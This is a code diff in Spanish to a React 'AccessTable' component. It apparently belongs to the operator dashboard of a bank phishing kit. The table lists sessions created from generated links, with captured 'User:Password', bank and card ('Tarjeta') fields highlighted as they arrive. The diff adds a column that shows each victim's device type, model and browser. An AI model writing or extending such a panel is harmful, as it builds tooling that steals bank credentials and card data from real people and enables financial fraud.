@@ -415,6 +415,36 @@ const AccessTable: React.FC<AccessTableProps> = ({
                       </div>
                     </div>
                     
+                    {/* Información del dispositivo */}
+                    {session.deviceType && (
+                      <div className="mb-3 flex gap-1 items-center">
+                        <Smartphone className="h-4 w-4 text-[#888]" />
+                        <div className="text-sm text-[#ccc]">
+                          <div className="flex items-center gap-2">
+                            <span className={`px-2 py-1 rounded text-xs ${
+                              session.deviceType === 'Android' ? 'bg-green-900 text-green-300' :
+                              session.deviceType === 'iPhone' ? 'bg-blue-900 text-blue-300' :
+                              'bg-gray-700 text-gray-300'
+                            }`}>
+                              {session.deviceType === 'Android' ? '📱 Android' :
+                               session.deviceType === 'iPhone' ? '📱 iOS' :
+                               '💻 Escritorio'}
+                            </span>
+                          </div>
+                          {session.deviceModel && (
+                            <div className="text-xs mt-1 opacity-80">
+                              {session.deviceModel}
+                            </div>
+                          )}
+                          {session.deviceBrowser && (
+                            <div className="text-xs opacity-70">
+                              {session.deviceBrowser}
+                            </div>
+                          )}
+                        </div>
+                      </div>
+                    )}
+                    
                     {(session.username || session.password) && (
                       <div className="mb-3 flex gap-1 items-center">
                         <AlertCircle className="h-4 w-4 text-[#888]" />
@@ -581,6 +611,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
               <tr className="bg-[#222]">
                 <th className="p-2 text-left w-[30px]">#</th>
                 <th className="p-2 text-left w-[70px]">Folio</th>
+                <th className="p-2 text-left w-[110px]">Dispositivo</th>
                 <th className="p-2 text-left w-[120px]">User:Password</th>
                 <th className="p-2 text-left w-[90px]">Banco</th>
                 <th className="p-2 text-left w-[150px]">Tarjeta</th>
@@ -598,7 +629,7 @@ const AccessTable: React.FC<AccessTableProps> = ({
             <tbody>
               {filteredSessions.length === 0 && (
                 <tr>
-                  <td colSpan={12} className="p-4 text-center text-gray-400">
+                  <td colSpan={15} className="p-4 text-center text-gray-400">
                     No hay sesiones activas. Genere un nuevo link para crear una sesión.
                   </td>
                 </tr>
@@ -614,6 +645,28 @@ const AccessTable: React.FC<AccessTableProps> = ({
                   <td className="p-2 text-[#ccc]">{index + 1}</td>
                   <td className={`p-2 ${highlightedFields[session.sessionId]?.folio ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.folio}
+                  </td>
+                  <td className="p-2 text-[#ccc]">
+                    {session.deviceType ? (
+                      <div className="text-xs">
+                        <span className={`px-1 py-0.5 rounded text-xs ${
+                          session.deviceType === 'Android' ? 'bg-green-900 text-green-300' :
+                          session.deviceType === 'iPhone' ? 'bg-blue-900 text-blue-300' :
+                          'bg-gray-700 text-gray-300'
+                        }`}>
+                          {session.deviceType === 'Android' ? '📱 Android' :
+                           session.deviceType === 'iPhone' ? '📱 iOS' :
+                           '💻 PC'}
+                        </span>
+                        {session.deviceModel && (
+                          <div className="mt-1 opacity-80 truncate" title={session.deviceModel}>
+                            {session.deviceModel.length > 15 ? 
+                              session.deviceModel.substring(0, 15) + '...' : 
+                              session.deviceModel}
+                          </div>
+                        )}
+                      </div>
+                    ) : '--'}
                   </td>
                   <td className={`p-2 ${highlightedFields[session.sessionId]?.credentials ? 'text-[#00ffff] font-bold' : 'text-[#ccc]'}`}>
                     {session.username && session.password 
